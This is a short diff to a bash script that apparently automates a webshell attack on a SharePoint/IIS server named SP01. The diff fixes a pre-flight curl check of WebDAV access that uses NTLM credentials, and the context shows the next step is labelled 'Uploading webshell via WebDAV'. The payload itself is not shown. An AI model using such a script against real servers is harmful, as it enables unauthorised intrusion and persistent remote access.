@@ -48,14 +48,18 @@ echo -e "${YELLOW}╚═══════════════════�
 echo ""
 
 
-# Pre-check: Verify WebDAV is accessible
+# Pre-check: Verify WebDAV is accessible before attempting upload
 echo -e "${YELLOW}[0/4] Pre-flight: checking WebDAV accessibility...${NC}"
-WEBDAV_CHECK="000""000"
-if [[ "" != "2"* && "" != "401" && "" != "403" ]]; then
-  echo -e "${RED}[FAIL] WebDAV not accessible (HTTP ${WEBDAV_CHECK}). Check SP01 IIS WebDAV.${NC}"
+WEBDAV_CHECK=$(curl -s -o /dev/null -w "%{http_code}" \
+  --ntlm -u "${CREDS}" \
+  -X OPTIONS "${SP_URL}/Shared%20Documents/" \
+  --connect-timeout 5 2>/dev/null || echo "000")
+if [[ "${WEBDAV_CHECK}" != "2"* && "${WEBDAV_CHECK}" != "401" && "${WEBDAV_CHECK}" != "403" ]]; then
+  echo -e "${RED}[FAIL] WebDAV not accessible (HTTP ${WEBDAV_CHECK}). Check SP01 IIS WebDAV settings.${NC}"
   exit 1
 fi
 echo -e "${GREEN}  [OK] WebDAV accessible (HTTP ${WEBDAV_CHECK})${NC}"
+
 
 # Step 1: Upload webshell via WebDAV
 echo -e "${YELLOW}[1/4] Uploading webshell via WebDAV...${NC}"
